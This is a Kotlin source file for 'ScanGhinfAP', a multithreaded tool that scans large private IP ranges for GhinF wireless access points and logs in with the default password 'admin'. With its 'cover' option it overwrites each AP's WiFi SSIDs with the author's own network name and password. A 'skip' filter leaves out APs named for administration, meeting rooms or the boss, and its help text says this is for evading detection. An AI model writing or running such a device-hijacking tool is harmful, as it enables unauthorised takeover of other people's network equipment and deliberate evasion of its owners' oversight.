package ltd.lths.wireless.ghinf.ap

import joptsimple.OptionParser
import ltd.lths.wireless.ghinf.ap.util.IPv4
import ltd.lths.wireless.ghinf.ap.util.SSID
import java.io.File
import java.util.concurrent.CompletableFuture

/**
 * ScanGhinfAP
 * ltd.lths.wireless.ghinf.ap.Main
 *
 * @author Score2
 * @since 2022/04/01 22:35
 */
object Main {

    // ansi 控制吗 \u001b
    @JvmStatic
    fun main(args: Array<out String>) {
        val parser = object : OptionParser() {
            init {
                acceptsAll(listOf("?", "help"), "获取帮助")
                acceptsAll(listOf("ip", "ips"), "给定ip范围")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("172.10-25.*.*")
                    .describedAs("ip段")
                acceptsAll(listOf("port", "p"), "自定义端口")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("80")
                    .describedAs("端口号")
                acceptsAll(listOf("thread", "t"), "自定义线程数")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("12")
                    .describedAs("线程数")
                acceptsAll(listOf("password", "pwd"), "自定义管理员密码")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("admin")
                    .describedAs("管理员密码")
                acceptsAll(listOf("skip", "skips"), "跳过带有指定名称的ap, 反侦察专用")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("行政,huiyishi,会议室,总")
                    .describedAs("名称")
                acceptsAll(listOf("wifi", "wlan"), "给定 WIFI 名称及密码, 用于覆盖")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("score2@github.com/755466879")
                    .describedAs("名称/密码")
                acceptsAll(listOf("scan"), "扫描指定ip范围的Ghinf信息")
                acceptsAll(listOf("cover"), "自动覆盖指定范围内的GhinF AP的 WIFI")

                acceptsAll(listOf("test"), "随意调试")
            }
        }

        val options = kotlin.runCatching { parser.parse(*args) }.getOrElse { test(); return }

        if (options.has("?")) {
            parser.printHelpOn(System.out)
            return
        }

        if (options.has("test")) {
            test()
            return
        }

        println("ScanGhinfAP 运行中...")

        var ips: List<IPv4> = listOf(IPv4("172.10.0.1"))
        var port = 80
        var thread = 12
        var password = "admin"
        var skips: List<String> = listOf()
        var ssids: List<SSID> = listOf()


        if (options.has("ip")) {
            println("正在遍历ip段...")
            ips = IPv4.from(options.valueOf("ip").toString()).toList()
            println("ip已生成 ${ips.size} 个")
        }
        if (options.has("port")) {
            port = options.valueOf("port").toString().toInt()
        }
        if (options.has("thread")) {
            thread = options.valueOf("thread").toString().toInt()
        }
        if (options.has("pwd")) {
            password = options.valueOf("pwd").toString()
        }
        if (options.has("skip")) {
            skips = options.valueOf("skip").toString().split("\\s*,\\s*".toRegex())
        }
        if (options.has("wifi")) {
            ssids = options.valueOf("wifi").toString().let {
                val format = it.split("/")
                listOf(
                    SSID(format[0], format.getOrNull(1) ?: "", SSID.Encryption.WPA2_PSK2, SSID.Frequency.WLAN_2G),
                    SSID(format[0], format.getOrNull(1) ?: "", SSID.Encryption.WPA2_PSK2, SSID.Frequency.WLAN_5G),
                )
            }
        }

        val ghinfaps = mutableMapOf<String, GhinfAP>()
        val covered = mutableSetOf<String>()

        fun find(iPv4: IPv4, log: Boolean = true): GhinfAP? {
            val ap = GhinfAP.of(iPv4, port, password) ?: return null
            val name = ap.deriveName
            ghinfaps[name] = ap
            if (log) println("找到GhinF AP 设备 ${ap.deriveName}@${ap.host}")
            return ap
        }
        var outLength: Int
        var printing = false
        when {
/*            options.has("scan") -> {
                println("开始搜寻")

                val logFile = File("scan-log.txt")
                logFile.createNewFile()
                logFile.writeText("# scan")
                val logWriter = logFile.printWriter()

                ips.forEach {
                    print("正在尝试IP: $it:$port     ".also { outLength = it.length })
                    if (!GhinfAP.idGhinfAP(it)) {
                        (0..outLength * 2).forEach { _ ->
                            print("\b")
                        }
                        return@forEach
                    }
                    (0..outLength * 2).forEach { _ ->
                        print("\b")
                    }

                    kotlin.runCatching {
                        val ap = find(it) ?: return@runCatching
                        logWriter.println("${ap.deriveName}@${ap.host}")
                    }
                }

                logWriter.close()


            }*/
            options.has("scan") || options.has("cover") -> {
                println("开始扫描")
                if (options.has("cover")) {
                    println("需要覆盖的 WIFI 列表:")
                    ssids.forEach {
                        println("+ [${it.frequency.ghz}]${it.id}")
                    }
                }
                println("过滤器: ${skips.joinToString()}")

                val logFile = File("cover-log.txt")
                logFile.createNewFile()
                logFile.writeText("# cover, filter: ${skips.joinToString()}")
                val logWriter = logFile.printWriter()

                val iterator = ips.iterator()
                val threadpool: MutableList<Pair<IPv4, CompletableFuture<GhinfAP?>>?> = mutableListOf()
                repeat(thread) {
                    println()
                    threadpool.add(null)
                }

                fun calibration() {
                    repeat(thread + 1) {
                        println()
                    }
                    repeat(thread + 1) {
                        print("\u001B[1A")
                    }
                    print("\u001B[s")
                }
                fun cover(ap: GhinfAP) {
                    var out = "已找到 GhinF AP 设备 ${ap.deriveName}@${ap.host}\n"

                    if (covered.contains(ap.deriveName)) {
                        out += "    已覆盖该 AP ${ap.deriveName}, 跳过\n"
                        return
                    }
                    if (skips.any { ap.deriveName.contains(it) }) {
                        out += "    已跳过该 AP\n"
                        return
                    }
                    ap.ssids = ap.ssids.also {
                        it.removeAll { it.id.contains("[") }
                        it.removeIf { origin -> ssids.any { it.id == origin.id } }
                        it.addAll(ssids)
                        it.forEach {
                            out += "      ${it.id}<${it.frequency.ghz}> & ${it.encryption}\n"
                        }
                        ssids.forEach {
                            out += "    + ${it.id}<${it.frequency.ghz}> & ${it.encryption}\n"
                        }
                    }
                    logWriter.println("${ap.deriveName}@${ap.host} | ${ap.ssids.joinToString { it.id }}")

                    covered.add(ap.deriveName)

                    printing = true
                    print("\u001B[u${out.split("\n").joinToString("                       \n")}")
                    calibration()
                    printing = false
                }
                calibration()
                while (iterator.hasNext()) {
                    threadpool.forEachIndexed { i, c ->
                        if (!iterator.hasNext()) {
                            return@forEachIndexed
                        }
                        if (c?.second?.isDone == true) {
                            val ap = c.second.get()
                            if (options.has("cover")) {
                                if (ap != null) {
                                    kotlin.runCatching {
                                        CompletableFuture.runAsync {
                                            cover(ap)
                                        }
                                    }
                                    threadpool[i] = null
                                    return@forEachIndexed
                                }
                            } else {
                                if (ap != null) {
                                    printing = true
                                    println("\u001B[u[$i] ${ap.deriveName}@${ap.host}                          ")
                                    calibration()
                                    printing = false
                                }
                            }
                            threadpool[i] = null
                        }
                        if (c == null) {
                            val ipv4 = iterator.next()

                            threadpool[i] = ipv4 to CompletableFuture.supplyAsync {
                                if (!GhinfAP.idGhinfAP(ipv4)) {
                                    return@supplyAsync null
                                }
                                find(ipv4, false)
                            }

                        }
                    }
                    var out = "\u001B[u<==================== 线程数: $thread ====================>\n"
                    threadpool.forEachIndexed { i, c ->
                        out += if (c == null) {
                            "[线程 ${i.plus(1)}] ---                                               \n"
                        } else {
                            "[线程 ${i.plus(1)}] 正在扫描 IP ${c.first}:$port        \n"
                        }
                    }
                    out.removeSuffix("\n")
                    outLength = out.toByteArray().size
                    if (!printing) print(out)

                }
                calibration()
            }
        }


    }

    fun test() {
/*        File("ips.txt").printWriter().let { writer ->
            IPv4.from("172.10-25,30.*.*").forEach {
                writer.println(it.toString())
            }
        }*/
        val ssids = mutableListOf(
            SSID("score2@github.com", "17308930", SSID.Encryption.WPA2_PSK2, SSID.Frequency.WLAN_2G, false, 0),
            SSID("score2@github.com", "17308930", SSID.Encryption.WPA2_PSK2, SSID.Frequency.WLAN_5G, false, 0)
        )
        GhinfAP.of("172.10.0.3", 6996)?.let { ap: GhinfAP ->
            println(ap.cookie)
            println(ap.deriveName)
            println("SSID:")
            ap.ssids = ap.ssids.also {
                it.removeIf { origin -> ssids.any { it.id == origin.id } }
                it.addAll(ssids)
            }
            ap.confirmSsids()

        }
    }

}